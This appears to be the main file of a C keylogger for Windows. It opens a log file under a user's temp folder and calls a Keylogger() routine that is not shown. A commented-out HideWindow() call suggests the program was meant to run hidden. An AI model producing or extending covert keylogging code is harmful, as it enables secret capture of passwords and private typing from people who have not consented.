#include "winkey.h"

FILE    *LogFile = NULL;

int main(void)
{
    // HideWindow();

    errno_t err;

    err = fopen_s(&LogFile, "C:\\Users\\Vicente\\Tmp\\KeyLog.txt", "a+");

    if (err != 0)
    {
        printf("Error opening file: %d\n", err);
        if (err == EACCES)
            printf("Permission denied or file already in use\n");
        return 1;
    }
    
    if (Keylogger() == false)
    {
        fclose(LogFile);
        return 1;
    }


    fclose(LogFile);
    
    return 0;
}